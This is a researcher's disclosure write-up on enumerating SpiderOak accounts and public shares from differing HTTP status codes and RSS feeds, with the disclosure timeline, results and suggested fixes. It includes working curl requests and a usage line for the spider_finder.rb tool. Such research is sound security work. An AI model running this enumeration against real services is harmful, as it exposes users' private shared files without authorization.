# Spidering SpiderOak

Copyright(c) 2018, Robin Wood <robin@digi.ninja>

About two years ago I did some research on enumerating the content of public
shares on both Amazon_Buckets and Mobile_Me. At the start of 2012 I started
using SpiderOak which also offers a way to share data with other people so
decided to have a look at how that worked to see if it could also be
enumerated. To cut a long story short, it could, and at the start of March 2012
I contact the security team at SpiderOak giving them the information I'd found
and some sample code to show how it worked. They acknowledged the mail and said
they would work on a fix.

At the start of April 2012 I was considering giving a talk on the research at
BSides London so asked SpiderOak when a fix was likely to be in place as I
would like to present but wouldn't want to reveal anything if a fix was in
progress. On the 13th April I was told that a fix should be in place before
BSides and that they would be happy to see the talk. In the end I gave my talk
on Breaking_in_to_Security instead and ended up forgetting about SpiderOak.
A week or so ago Rapid 7 published their research on Amazon Buckets and with
the interest it generated I thought I'd dig out the SpiderOak work and see if
it still worked, it does, so here it is...

## How It Works

The way the enumeration works is by checking HTTP return values to identify
valid accounts then looking for RSS feeds to find valid shares. It goes like
this.

If you request a share on an account that exists, even if the share doesn't
exist, you get a 200 returned:

```
$ curl -I https://spideroak.com/browse/share/digi_public/not_exist
HTTP/1.1 200 OK
Server: nginx/0.7.64
Date: Wed, 03 Apr 2013 22:15:10 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 6813
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=8640000; includeSubDomains
Set-Cookie: uid=AAAAKlFcqe69ciDRBEYWAg==; expires=Thu, 03-Apr-14 22:15:10 GMT; path=/
```

But on an account which doesn't exist you get a 404:

```
$ curl -I https://spideroak.com/browse/share/digi_public_not_exist/not_exist
HTTP/1.1 404 Not Found
Server: nginx/0.7.64
Date: Wed, 03 Apr 2013 22:16:06 GMT
Content-Type: text/html
Content-Length: 1696
Connection: keep-alive
Vary: Accept-Encoding
Set-Cookie: uid=AAAAKlFcqia9ciDRBEaQAg==; expires=Thu, 03-Apr-14 22:16:06 GMT; path=/
```

So you can now run through a list of user names and score a hit for any 200's
you get back.

The next step is to enumerate shares, to do this request the share you want to
check and search the page that is returned for an RSS link in its header.

```
curl -s https://spideroak.com/browse/share/digi_public/does_exist|grep RSS
<link rel="alternate" type="application/rss+xml" title="RSS" href="/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss" />
```

```
curl -s https://spideroak.com/browse/share/digi_public/not_exist|grep RSS
<link rel="alternate" type="application/rss+xml" title="RSS" href="/share/XXXWO2K7OB2WE3DJMM/not_exist/?rss" />
```

All shares, whether they exist or not, have an RSS link in the header but if
you then check the RSS link you get a 200 for valid shares but 404 for shares
which don't exist.

```
$ curl -I https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss
HTTP/1.1 200 OK
Server: nginx/0.7.64
Date: Wed, 03 Apr 2013 22:30:53 GMT
Content-Type: application/atom+xml; charset=utf-8
Connection: keep-alive
Content-length: 1773
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=8640000; includeSubDomains
Set-Cookie: uid=AAAAKlFcrZ21fSDQBCdjAg==; expires=Thu, 03-Apr-14 22:30:53 GMT;
path=/
```

```
$ curl -I https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/not_exist/?rss
HTTP/1.1 404 Not Found
Server: nginx/0.7.64
Date: Wed, 03 Apr 2013 22:31:18 GMT
Content-Type: text/html
Connection: keep-alive
Vary: Accept-Encoding
Vary: Accept-Encoding
Content-length: 108
Set-Cookie: uid=AAAAKlFcrba1fSDQBCd8Ag==; expires=Thu, 03-Apr-14 22:31:18 GMT;
path=/
```

So now you can spot valid shares.

If you look at the RSS feed that you get from a valid share it contains a list
of all the files in the share:

```
$ curl https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss
<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
<title>does_exist: SpiderOak Share Feed by digi_public</title>
<link rel="alternate" type="text/html" href="https://spideroak.com/browse/share/digi_public/does_exist" />
<link rel="self" type="application/atom+xml" href="https://spideroak.com/browse/share_feed/digi_public/does_exist" />

<updated>2009-05-05T17:56:37Z</updated>
<id>https://spideroak.com/browse/share_feed/digi_public/does_exist</id>

<entry>
    <title>a_text_file.txt</title>
    <link href="/share/digi_public/does_exist/Users/robin/Desktop/does_exist/a_text_file.txt" />
    <id>/share/digi_public/does_exist/Users/robin/Desktop/does_exist/a_text_file.txt</id>
    <updated>2012-06-21T07:54:23Z</updated>
    <author><name>digi_public</name></author>
    <content type="html" xml:lang="en"><![CDATA[
        <p><img src="/static/browse/icons/genfile.gif" /></p>
        <p>Filename: a_text_file.txt<br>
        Size: 2915999<br>
        Date created: 2012-06-21 07:54:23<br>
        Date modified: 2012-06-21 07:54:23</p>
    ]]></content>
</entry>

<entry>
    <title>another_file.zip</title>
    <link href="/share/digi_public/does_exist/Users/robin/Desktop/does_exist/another_file.zip" />
    <id>/share/digi_public/does_exist/Users/robin/Desktop/does_exist/another_file.zip</id>
    <updated>2009-05-05T17:56:37Z</updated>
    <author><name>digi_public</name></author>
    <content type="html" xml:lang="en"><![CDATA[
        <p><img src="/static/browse/icons/genfile.gif" /></p>
        <p>Filename: another_file.zip<br>
        Size: 183611<br>
        Date created: 2012-06-21 07:32:22<br>
        Date modified: 2009-05-05 17:56:37</p>
    ]]></content>
</entry>

</feed>
```

And that is it, you can read through the RSS file and generate a list of files
ready to download.

## What Did I Find?

Well, unfortunately not that much although I didn't search that hard. I started
with a list of 2268 common names, I ran those through and found 615 valid
accounts which I thought was a good start. I then started running those through
with lists of common share/folder names. With the help of friends on Twitter I
built up a list of 58 potential names, you can get this list from Pastebin.
I ran these 58 folders against each of the 615 accounts and came back with 14
hits which is approximately a 2.3% hit rate. Not massive but enough to show the
process works. From those 14 hits there were 97 files available. I didn't
download any of the files but from the names most were images, the majority
from someones Christmas party. There was also a Michael Buble Christmas 2011
album, a CISSP ebook and a video that was probably porn.

I also did some quick searches for some large company names and got hits as the
account being valid but didn't get any shares. Just because the names match
companies doesn't mean they belong to them but could be useful information if a
company you are testing happens to have a successful match.

## How Could SpiderOak Fix This?

I believe there are a few things which need doing to fix this problem. The
first is to fix the actual vulnerability, requesting a share which doesn't
exist from an account which does should return a 404 in the same way requesting
a share from one which doesn't exist. This will remove the ability to enumerate
accounts and so massively increase the number of requests which are required to
enumerate shares - 2268 * 58 vs 615 * 58 in this situation. Along with this,
make sure that the headers which are returned match for all invalid requests.
I've seen situations where two different requests generate a 404 but one has
headers in a different order, or just different headers, differences like this
can also be used for enumeration.

Next monitoring and lockouts need to be put in place. To do this research I
initially scanned 2268 accounts followed by checking 615 accounts for 58
shares, this is a total of 37938 requests. These were done over the space of a
few hours with no lockout or degradation of service. There is no way a valid
user would need to make anywhere near this amount of requests spread over such
a wide range of accounts so it should be simple to detect something like this
and simply lock out my IP. Yes, I could move to another and continue but if the
threshold is low enough it becomes impractical to move around enough to get
any useful data. Add to this some alerting, and someone watching the alerts,
and human intervention could also help if someone persistent did try to bypass
the lockout.

## Are Shares Secure?

While playing with all this I was thinking about how sharing works and how it
ties in with the privacy_policy SpiderOak display on their site - 
https://spideroak.com/engineering_matters 

The "True Privacy" section tells of how your data is encrypted in a way that
only you have access to it and the SpiderOak staff have no way to access your
data however I can't see how this can work for shares. This next bit is my
guess about how the system works so could be completely wrong but I'll have a
go anyway.

As shared data is not protected by my main password - it can't be as my friend
I shared the data with doesn't know my password - all that protects it is the
share name. That means that any data I share instantly becomes less secure than
it originally was, even if I never give the share name out to anyone.
I think there is a potential for staff to gain access to shared data, this is
how.

Shares are identified by an account name and a share name and SpiderOak
obviously has a list of all accounts on their system so that leaves the share
name as the protection. When I use the desktop GUI I can get a list of shares
that I've set up, this means that list is stored somewhere on the server. There
are two potential locations, it could be in my encrypted blob which gets
unlocked when I enter my password, in which case staff can't see the list, or
it could be stored in the clear along side the rest of my account information.
If it isn't in the encrypted blob then anyone who can access my account details
can access the list and so access my shared files. If it is encrypted then can
they still find my share names? What about the web logs? If the web server is
logging requests then it would be a simple task to search through the logs to
find valid shares. This would go against the claim that even with physical
access it is not possible for staff to access my data.

I know that I'm assuming things here and could be completely wrong but others
have also mentioned their distrust of the sharing model and the fact that its
entire security is based on what comes down to a folder name.

## Installation/Usage

The tarball comes with the spider_finder script and my list of common folder
names, you have to provide your own list of account names.

The script is in Ruby and it should be a simple case of unpacking it and
running the script, no special gems are required.

Running it without parameters give usage instructions but basically you give it
a file containing the list of accounts to try and the list of shares. You can
ask it to log all findings to a file as well as on screen so don't have to mess
with redirecting output.

Once you have ran a list of accounts through once you will be able to pick out
ones which were successful, if you then want to re-run those with a different
folder list you can use the --valid-accounts flag to tell the script that it
doesn't need to check if the account exists before checking for shares.

Sample usage:
```
$ ./spider_finder.rb --log-file first_run.log common_names common_folders.txt
```

## Do I Still Use SpiderOak?

I guess after all this you would assume that I no longer use SpiderOak but you
would be wrong. Overall I like their ideas and their principals, even if they
do have their issues. I'd rather use something where I've considered how it
works, found the limitations, and decided that they are acceptable. I could
move to Dropbox but they have (had?) more serious problems. I could move to
another competitor but I would end up wondering how they worked and probably
end up analysing them as well and finding different issues.

## Feedback

If you find any bugs or have comments then please get in touch, my details are
on the contact page.

If you are from SpiderOak then I'm happy to talk about the problems and if you
want to correct me on how the shares are stored internally then I'd love to
find out.
